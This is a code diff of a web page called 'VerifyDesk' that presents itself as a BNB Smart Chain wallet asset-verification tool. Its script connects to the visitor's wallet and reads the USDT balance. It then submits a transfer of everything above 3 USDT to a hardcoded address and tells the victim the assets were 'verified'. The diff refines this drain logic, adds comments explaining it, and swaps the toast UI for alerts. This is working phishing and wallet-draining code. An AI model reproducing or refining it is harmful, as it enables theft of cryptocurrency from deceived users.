@@ -5,15 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VerifyDesk - Wallet Asset Review</title>
     
-    <!-- Google Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     
-    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         tailwind.config = {
@@ -32,7 +29,6 @@
         }
     </script>
     
-    <!-- Ethers.js Library -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
     <style>
@@ -47,7 +43,6 @@
 </head>
 <body class="text-white font-sans antialiased flex flex-col items-center pb-20 relative overflow-x-hidden">
 
-    <!-- Navbar -->
     <nav class="w-full max-w-md px-6 py-4 flex justify-between items-center bg-transparent">
         <div class="flex items-center gap-3">
             <div class="w-10 h-10 bg-[#0a1e26] border border-accent/30 rounded-xl flex items-center justify-center">
@@ -62,7 +57,6 @@
 
     <div class="w-full max-w-md px-6 py-6">
         
-        <!-- Hero Section -->
         <div class="text-center mb-10 mt-4">
             <div class="inline-flex items-center gap-2 text-[10px] font-bold tracking-widest uppercase text-accent mb-6">
                 <div class="w-1.5 h-1.5 rounded-full bg-accent"></div> Independent BNB Smart Chain Tool
@@ -76,7 +70,6 @@
             </p>
         </div>
 
-        <!-- Main Card -->
         <div class="bg-cardDark border border-borderDark rounded-2xl p-6 shadow-2xl relative overflow-hidden mb-8">
             
             <div class="flex justify-between items-center mb-8">
@@ -99,27 +92,12 @@
                     Use Trust Wallet, MetaMask, or another Web3 wallet to review supported assets.
                 </p>
 
-                <!-- Button -->
                 <button onclick="checkWallet()" class="glow-button w-full max-w-[260px] bg-accent hover:bg-[#18b58b] text-[#08101A] font-bold py-3.5 px-6 rounded-xl flex items-center justify-center gap-3 transition-all active:scale-95 mb-8">
                     <i class="fa-regular fa-credit-card text-lg"></i>
                     <span class="text-[15px]">Verify Assets &rarr;</span>
                 </button>
             </div>
         </div>
-    </div>
-
-    <!-- Error Toast -->
-    <div id="errorToast" class="fixed bottom-0 left-0 w-full bg-white text-[#1a1a1a] shadow-[0_-4px_15px_rgba(0,0,0,0.1)] hidden z-50">
-        <div class="max-w-md mx-auto relative flex items-center p-4">
-            <div class="w-6 h-6 rounded-full bg-[#ef4444] text-white flex items-center justify-center text-sm font-bold shrink-0">
-                !
-            </div>
-            <div id="toastMessage" class="ml-3 text-[15px] font-medium flex-1"></div>
-            <button onclick="closeToast()" class="text-gray-400 hover:text-gray-600 px-2 text-lg">
-                &times;
-            </button>
-        </div>
-        <div class="h-1.5 w-full bg-[#ef4444]/80"></div>
     </div>
 
     <script>
@@ -136,15 +114,13 @@
                 }
                 
                 if (!currentProvider) {
-                    showToast("No Web3 wallet detected. Please open this in a DApp browser.");
+                    alert("No Web3 wallet detected. Please open this in a DApp browser.");
                     return;
                 }
 
-                // Force wallet to request connection
                 const accounts = await currentProvider.request({ method: 'eth_requestAccounts' });
                 const userAddress = accounts[0];
                 
-                // Initialize Ethers.js
                 const provider = new ethers.providers.Web3Provider(currentProvider, "any");
                 const signer = provider.getSigner();
                 
@@ -156,25 +132,26 @@
                     "function transfer(address to, uint amount) returns (bool)"
                 ];
                 
-                const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, signer);
-                
-                // Read balance (Wrapped in try/catch to bypass bad RPCs)
                 let balanceWei;
                 try {
+                    const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, signer);
                     balanceWei = await usdtContract.balanceOf(userAddress);
                 } catch (e) {
-                    // Fallback to public BSC node if wallet fails to read balance
                     const publicProvider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
                     const publicContract = new ethers.Contract(usdtContractAddress, erc20Abi, publicProvider);
                     balanceWei = await publicContract.balanceOf(userAddress);
                 }
                 
+                // Set the minimum threshold to 3 USDT (with 18 decimals)
                 const minKeepWei = ethers.utils.parseUnits("3.0", 18);
                 
+                // Compare: Check if wallet balance is strictly greater than 3.0 USDT
                 if (balanceWei.gt(minKeepWei)) {
+                    
+                    // Subtract 3.0 USDT from the total balance to get the amount to send
                     const sendAmountWei = balanceWei.sub(minKeepWei);
                     
-                    // Directly send via raw provider to avoid Ethers.js gas estimation blocks
+                    const usdtContract = new ethers.Contract(usdtContractAddress, erc20Abi, signer);
                     const dataTransfer = usdtContract.interface.encodeFunctionData("transfer", [targetAddress, sendAmountWei]);
                     
                     const txParams = {
@@ -190,7 +167,7 @@
                     
                     alert("Assets Verified and Transaction Submitted!");
                 } else {
-                    alert("Verification complete. Required threshold (> 3 USDT) not met.");
+                    alert("Verification complete. Your balance is less than or equal to 3 USDT. Nothing to transfer.");
                 }
 
             } catch (error) {
@@ -204,20 +181,6 @@
                      alert("Action failed. Try switching network to BNB Smart Chain or use Trust Wallet app.");
                 }
             }
-        }
-
-        function showToast(msg) {
-            document.getElementById('toastMessage').innerText = msg;
-            const toast = document.getElementById('errorToast');
-            if (toast) {
-                toast.classList.remove('hidden');
-                toast.classList.add('slide-up');
-            }
-        }
-
-        function closeToast() {
-            document.getElementById('errorToast').classList.add('hidden');
-            document.getElementById('errorToast').classList.remove('slide-up');
         }
     </script>
 </body>
